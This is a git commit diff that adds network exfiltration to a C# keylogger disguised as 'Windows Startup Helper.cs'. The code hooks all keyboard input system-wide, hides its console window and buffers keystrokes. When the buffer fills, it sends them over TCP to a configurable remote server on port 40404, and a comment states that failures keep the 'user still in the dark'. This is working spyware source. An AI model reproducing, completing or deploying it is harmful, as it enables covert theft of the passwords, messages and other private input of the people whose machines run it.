19d973e61867f05f0548948ee0ad6a00ee6916b2
bli95 <cli91@illinois.edu>
2018-04-17 19:40:43 -0500

    Completed key logging functionality strictly based on filled buffer

--- Windows Startup Helper.cs
+++ Windows Startup Helper.cs
@@ -1,24 +1,34 @@
+/*
+Adapted from URL=[http://www.businessinsider.com/how-to-create-a-simple-hidden-console-keylogger-in-c-sharp-2012-1]
+Used socket code from URL=[https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-client-socket-example]
+*/
+
 using System;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Diagnostics;
 using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 
 public static class Globals
 {
-    public static String serverIP = "~~~~~";
-    public static Int32 keyPort = 40404;
-    public static Int32 screenPort = 40405;   
+    public const string serverIP = "~~~~~";
+    public const Int32 keyPort = 40404;
+    public const Int32 screenPort = 40405;
 }
 
-public class Windows_System32_Startup
+public class WinLogger
 {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
-    private static LowLevelKeyboardProc proc = HookFunc;
+    private static LowLevelKeyboardProc proc = KeyLogging;
     private static IntPtr hookInt = IntPtr.Zero;
-	private char[] userBuffer = new char[256];
-    private int bufIndex = 0;
+    private static Keys[] userBuffer = new Keys[256];
+    private static int bufIndex = 0;
+    private const int MAX_KEY_CHARS = 18;
+    
     static public void Main ()
     {
         var wind = GetConsoleWindow();
@@ -29,23 +39,61 @@ public class Windows_System32_Startup
     }
     
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
+    private static IntPtr KeyLogging(int nCode, IntPtr wParam, IntPtr lParam)
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
             Console.WriteLine((Keys)vkCode);
-            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
-            sw.Write((Keys)vkCode);
-            sw.Close();
+            userBuffer[bufIndex++] = (Keys)vkCode;
+            
+            if(bufIndex > 255)
+            {
+                flushBufferToServer(ref userBuffer, bufIndex);
+                bufIndex = 0;
+            }
         }
         return CallNextHookEx(hookInt, nCode, wParam, lParam);
     }
+
+    private static void flushBufferToServer(ref Keys[] buf, int end_idx) {
+        string concatBuf = "";
+        for(int i = 0; i < end_idx; i++)
+        {
+            concatBuf += buf[i].ToString();
+        }
+
+        try {
+            // Establish the remote endpoint for the socket.  
+            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
+            IPAddress ipAddress = IPAddress.Parse(Globals.serverIP);
+            IPEndPoint remoteEP = new IPEndPoint(ipAddress, Globals.keyPort);  
+
+            // Create a TCP/IP  socket.  
+            Socket server = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  
+
+            // Connect the socket to the remote endpoint. Catch any errors.  
+            try {  
+                server.Connect(remoteEP);
+
+                // Encode the data string into a byte array.
+                byte[] msg = Encoding.ASCII.GetBytes(concatBuf); 
+
+                // Send the data through the socket.  
+                int bytesSent = server.Send(msg);
+
+                // Release the socket.  
+                server.Shutdown(SocketShutdown.Both);  
+                server.Close();
+            } catch (Exception) {  
+                /* If something goes wrong, oh well. At least user is still in the dark. */
+            }
+        } catch (Exception) {}
+    }
     
     //These Dll's will handle the hooks.
-
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook,
+    private static extern IntPtr SetWindowsHookEx(int idHook, 
     LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
     
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -60,7 +108,6 @@ public class Windows_System32_Startup
     private static extern IntPtr GetModuleHandle(string lpModuleName);
     
     // The two dll imports below will handle the window hiding.
-    
     [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
     
